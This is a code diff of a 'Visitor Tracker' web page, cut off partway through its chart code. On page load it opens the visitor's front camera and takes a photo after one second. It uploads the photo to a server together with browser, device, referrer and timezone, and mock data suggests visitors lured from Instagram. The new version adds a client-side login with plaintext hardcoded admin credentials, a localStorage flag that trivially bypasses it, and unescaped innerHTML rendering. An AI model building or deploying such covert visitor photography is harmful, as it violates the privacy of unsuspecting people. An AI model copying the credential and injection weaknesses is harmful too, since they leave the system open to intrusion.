@@ -1,264 +1,311 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Visitor Tracker</title>
-  <style>
-    #camera-preview {
-      width: 640px;
-      height: 480px;
-      display: none;
-    }
-    #photo-canvas {
-      display: none;
-    }
-    /* Add styles for photo gallery, charts, and other elements */
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Visitor Tracker</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f0f0;
+        }
+
+        .header {
+            background-color: #333;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .container {
+            width: 80%;
+            margin: 0 auto;
+        }
+
+        .main-content {
+            padding: 20px;
+            text-align: center;
+        }
+
+        /* Admin Login Form */
+        .login-form {
+            width: 300px;
+            margin: 100px auto;
+            padding: 20px;
+            background-color: white;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .login-form input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        /* Camera Section */
+        #camera-preview {
+            width: 640px;
+            height: 480px;
+            display: none;
+            margin: 20px auto;
+        }
+
+        #photo-canvas {
+            display: none;
+        }
+
+        /* Photo Gallery */
+        #photo-gallery {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .visitor-card {
+            background-color: white;
+            padding: 10px;
+            border-radius: 5px;
+            width: 200px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .visitor-photo {
+            width: 100%;
+            height: auto;
+            border-radius: 5px;
+        }
+
+        .photo-info {
+            margin-top: 10px;
+        }
+
+        .truncate {
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            max-width: 200px;
+        }
+
+        /* Charts */
+        canvas {
+            max-width: 100%;
+            height: 300px;
+            margin-top: 20px;
+        }
+    </style>
 </head>
 <body>
-  <!-- Camera Preview -->
-  <video id="camera-preview" autoplay></video>
-  <canvas id="photo-canvas"></canvas>
 
-  <!-- Photo Gallery (existing) -->
-  <div id="photo-gallery">
-    <!-- Gallery content will be dynamically added here -->
-  </div>
+    <!-- Admin Login Form (Initially Visible) -->
+    <div class="login-form" id="login-form">
+        <h2>Admin Login</h2>
+        <input type="text" id="username" placeholder="Username" />
+        <input type="password" id="password" placeholder="Password" />
+        <button onclick="login()">Login</button>
+        <p id="login-error" style="color: red; display: none;">Invalid credentials. Please try again.</p>
+    </div>
 
-  <!-- Charts (existing) -->
-  <canvas id="device-chart"></canvas>
-  <canvas id="referrer-chart"></canvas>
+    <!-- Main Landing Page (Visible After Login) -->
+    <div class="header" id="landing-page" style="display: none;">
+        <h1>Visitor Tracker</h1>
+        <p>Track your visitors' data and activity in real-time.</p>
+    </div>
 
-  <script>
-    let stats = {
-      deviceBreakdown: {
-        Mobile: 10,
-        Desktop: 5,
-        Tablet: 3
-      },
-      referrerBreakdown: {
-        instagram: 7,
-        direct: 5,
-        google: 3
-      }
-    };
+    <div class="container" id="content" style="display: none;">
+        <!-- Camera Section -->
+        <div class="main-content">
+            <h2>Take a Visitor Photo</h2>
+            <video id="camera-preview" autoplay></video>
+            <canvas id="photo-canvas"></canvas>
+        </div>
 
-    let deviceChart, referrerChart;
-
-    window.addEventListener('load', async () => {
-      try {
-        // Request camera access
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-          video: { 
-            facingMode: "user",
-            width: { ideal: 640 },
-            height: { ideal: 480 }
-          } 
-        });
-        
-        const video = document.getElementById('camera-preview');
-        video.srcObject = stream;
-
-        // Wait for video to be ready
-        video.onloadedmetadata = () => {
-          video.play();
-          
-          // Take photo after a short delay
-          setTimeout(() => {
-            capturePhoto(stream);
-          }, 1000);
-        };
-      } catch (err) {
-        console.error("Error accessing camera:", err);
-        recordVisitWithoutPhoto();
-      }
-    });
-
-    function capturePhoto(stream) {
-      const video = document.getElementById('camera-preview');
-      const canvas = document.getElementById('photo-canvas');
-      const context = canvas.getContext('2d');
-      
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      
-      // Get photo data
-      const photoData = canvas.toDataURL('image/jpeg', 0.8);
-      
-      // Stop camera stream
-      const tracks = stream.getTracks();
-      tracks.forEach(track => track.stop());
-      video.srcObject = null;
-      
-      // Send photo to server
-      recordVisitWithPhoto(photoData);
-    }
-
-    async function recordVisitWithPhoto(photoData) {
-      try {
-        // Upload photo
-        const uploadResponse = await fetch('/api/upload', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ photoData })
-        });
-        const uploadResult = await uploadResponse.json();
-
-        // Record visit with photo URL
-        await recordVisit(uploadResult.photoUrl);
-      } catch (error) {
-        console.error("Error recording visit with photo:", error);
-      }
-    }
-
-    async function recordVisitWithoutPhoto() {
-      await recordVisit(null);
-    }
-
-    async function recordVisit(photoUrl) {
-      const userAgent = navigator.userAgent;
-      const browser = getBrowserInfo(userAgent);
-      const device = getDeviceInfo(userAgent);
-      const referrer = document.referrer || "Direct";
-      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
-
-      // Simulating visitor record
-      const storedVisitors = JSON.parse(localStorage.getItem('visitors') || '[]');
-      storedVisitors.push({
-        device,
-        browser,
-        referrer,
-        visitedAt: new Date().toISOString(),
-        photoUrl
-      });
-      localStorage.setItem('visitors', JSON.stringify(storedVisitors));
-
-      renderVisitors(storedVisitors);
-      renderCharts();
-    }
-
-    function getBrowserInfo(userAgent) {
-      // Simple browser detection
-      if (userAgent.includes('Firefox')) return 'Firefox';
-      if (userAgent.includes('Chrome')) return 'Chrome';
-      if (userAgent.includes('Safari')) return 'Safari';
-      if (userAgent.includes('Edge')) return 'Edge';
-      return 'Unknown';
-    }
-
-    function getDeviceInfo(userAgent) {
-      // Simple device detection
-      if (userAgent.includes('Mobile')) return 'Mobile';
-      if (userAgent.includes('Tablet')) return 'Tablet';
-      return 'Desktop';
-    }
-
-    function renderVisitors(visitors) {
-      const photoGallery = document.getElementById('photo-gallery');
-      let galleryHtml = '';
-      
-      visitors.forEach(visitor => {
-        galleryHtml += `
-          <div class="photo-item">
-            <img src="${visitor.photoUrl || 'path/to/default-photo.jpg'}" alt="Visitor Photo" />
-            <div class="photo-info">
-              <p class="truncate">${visitor.device} / ${visitor.browser}</p>
-              <p class="truncate">${formatDate(visitor.visitedAt)}</p>
+        <!-- Visitor Gallery -->
+        <div>
+            <h2>Visitor Gallery</h2>
+            <div id="photo-gallery">
+                <!-- Visitor data will go here -->
             </div>
-          </div>
-        `;
-      });
-      
-      photoGallery.innerHTML = galleryHtml;
-    }
+        </div>
 
-    function formatDate(dateString) {
-      const date = new Date(dateString);
-      return `${date.toLocaleDateString()} ${date.toLocaleTimeString()}`;
-    }
+        <!-- Charts Section -->
+        <div>
+            <canvas id="device-chart"></canvas>
+            <canvas id="referrer-chart"></canvas>
+        </div>
+    </div>
 
-    function renderCharts() {
-      // Device chart
-      const deviceLabels = Object.keys(stats.deviceBreakdown);
-      const deviceData = Object.values(stats.deviceBreakdown);
-      const deviceColors = ['#0088FE', '#00C49F', '#FFBB28', '#FF8042', '#8884D8', '#FF6B6B'];
+    <!-- Script Section -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script>
+        let stats = {
+            deviceBreakdown: {},
+            referrerBreakdown: {}
+        };
 
-      if (deviceChart) {
-        deviceChart.destroy();
-      }
+        let deviceChart, referrerChart;
 
-      const deviceCtx = document.getElementById('device-chart').getContext('2d');
-      deviceChart = new Chart(deviceCtx, {
-        type: 'pie',
-        data: {
-          labels: deviceLabels,
-          datasets: [{
-            data: deviceData,
-            backgroundColor: deviceColors.slice(0, deviceLabels.length),
-            borderWidth: 1
-          }]
-        },
-        options: {
-          responsive: true,
-          maintainAspectRatio: false,
-          plugins: {
-            legend: {
-              position: 'bottom'
+        const ADMIN_USERNAME = "admin"; // Example username
+        const ADMIN_PASSWORD = "admin12231223"; // Example password
+
+        // Admin Login
+        function login() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
+                localStorage.setItem('adminLoggedIn', true);
+                document.getElementById('login-form').style.display = 'none';
+                document.getElementById('landing-page').style.display = 'block';
+                document.getElementById('content').style.display = 'block';
+                loadMockData();
+                renderGallery(JSON.parse(localStorage.getItem('visitors') || '[]'));
+                renderCharts();
+            } else {
+                document.getElementById('login-error').style.display = 'block';
             }
-          }
         }
-      });
 
-      // Referrer chart
-      const referrerLabels = Object.keys(stats.referrerBreakdown).map(label => label === 'direct' ? 'Direct' : label);
-      const referrerData = Object.values(stats.referrerBreakdown);
-      const referrerColors = ['#FF6B6B', '#8884D8', '#00C49F', '#FFBB28', '#0088FE', '#FF8042'];
-
-      if (referrerChart) {
-        referrerChart.destroy();
-      }
-
-      const referrerCtx = document.getElementById('referrer-chart').getContext('2d');
-      referrerChart = new Chart(referrerCtx, {
-        type: 'pie',
-        data: {
-          labels: referrerLabels,
-          datasets: [{
-            data: referrerData,
-            backgroundColor: referrerColors.slice(0, referrerLabels.length),
-            borderWidth: 1
-          }]
-        },
-        options: {
-          responsive: true,
-          maintainAspectRatio: false,
-          plugins: {
-            legend: {
-              position: 'bottom'
+        // Automatically request camera access when page loads
+        window.addEventListener('load', async () => {
+            if (localStorage.getItem('adminLoggedIn') !== 'true') {
+                return; // Prevent camera access if not logged in
             }
-          }
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: "user",
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    }
+                });
+
+                const video = document.getElementById('camera-preview');
+                video.srcObject = stream;
+
+                // Wait for video to be ready
+                video.onloadedmetadata = () => {
+                    video.play();
+
+                    // Take photo after a short delay
+                    setTimeout(() => {
+                        capturePhoto(stream);
+                    }, 1000);
+                };
+            } catch (err) {
+                console.error("Error accessing camera:", err);
+                recordVisitWithoutPhoto();
+            }
+        });
+
+        function capturePhoto(stream) {
+            const video = document.getElementById('camera-preview');
+            const canvas = document.getElementById('photo-canvas');
+            const context = canvas.getContext('2d');
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Get photo data
+            const photoData = canvas.toDataURL('image/jpeg', 0.8);
+
+            // Stop camera stream
+            const tracks = stream.getTracks();
+            tracks.forEach(track => track.stop());
+            video.srcObject = null;
+
+            // Send photo to server
+            recordVisitWithPhoto(photoData);
         }
-      });
-    }
 
-    // Mock Data for Demo
-    function loadMockData() {
-      const storedVisitors = JSON.parse(localStorage.getItem('visitors') || '[]');
-      if (storedVisitors.length > 0) return;
+        async function recordVisitWithPhoto(photoData) {
+            try {
+                // Upload photo
+                const uploadResponse = await fetch('/api/upload', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ photoData })
+                });
+                const uploadResult = await uploadResponse.json();
 
-      const mockVisitors = [
-        { id: 'mock1', device: 'Android', browser: 'Chrome', referrer: 'instagram.com', photoUrl: null, visitedAt: new Date(Date.now() - 2 * 60 * 60 * 1000).toISOString() },
-        { id: 'mock2', device: 'iOS', browser: 'Safari', referrer: 'direct', photoUrl: null, visitedAt: new Date(Date.now() - 4 * 60 * 60 * 1000).toISOString() },
-        { id: 'mock3', device: 'Windows', browser: 'Edge', referrer: 'instagram.com', photoUrl: null, visitedAt: new Date(Date.now() - 1 * 24 * 60 * 60 * 1000).toISOString() }
-      ];
+                // Record visit with photo URL
+                await recordVisit(uploadResult.photoUrl);
+            } catch (error) {
+                console.error("Error recording visit with photo:", error);
+            }
+        }
 
-      localStorage.setItem('visitors', JSON.stringify(mockVisitors));
-    }
+        async function recordVisitWithoutPhoto() {
+            await recordVisit(null);
+        }
 
-    loadMockData(); // Load mock data for demo
-  </script>
-</body>
-</html>
+        async function recordVisit(photoUrl) {
+            const userAgent = navigator.userAgent;
+            const browser = getBrowserInfo(userAgent);
+            const device = getDeviceInfo(userAgent);
+            const referrer = document.referrer || "Direct";
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
+
+            await fetch('/api/visitors/record-visit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    browser,
+                    device,
+                    referrer,
+                    timezone,
+                    visitTime: new Date().toISOString(),
+                    photoUrl
+                })
+            });
+        }
+
+        function getBrowserInfo(userAgent) {
+            if (userAgent.includes('Firefox')) return 'Firefox';
+            if (userAgent.includes('Chrome')) return 'Chrome';
+            if (userAgent.includes('Safari')) return 'Safari';
+            if (userAgent.includes('Edge')) return 'Edge';
+            return 'Unknown';
+        }
+
+        function getDeviceInfo(userAgent) {
+            if (userAgent.includes('Mobile')) return 'Mobile';
+            if (userAgent.includes('Tablet')) return 'Tablet';
+            return 'Desktop';
+        }
+
+        // Render the photo gallery
+        function renderGallery(visitors) {
+            const photoGallery = document.getElementById('photo-gallery');
+            let galleryHtml = '';
+
+            visitors.forEach(visitor => {
+                galleryHtml += `
+                    <div class="visitor-card">
+                        <img src="${visitor.photoUrl || 'No Image'}" alt="Visitor Photo" class="visitor-photo" />
+                        <div class="photo-info">
+                            <p class="truncate">${visitor.device} / ${visitor.browser}</p>
+                            <p class="truncate">${formatDate(visitor.visitedAt)}</p>
+                        </div>
+                    </div>
+                `;
+            });
+
+            photoGallery.innerHTML = galleryHtml;
+        }
+
+        // Render charts
+        function renderCharts() {
+            const deviceLabels = Object.keys(stats.deviceBreakdown);
+            const deviceData = Object.values(stats.deviceBreakdown);
+            const deviceColors = ['#0088FE', '#00C49F', '#FFBB28', '#FF8042', '#8884D8', '#FF6B6B'];
+            
+            // Device chart
+           
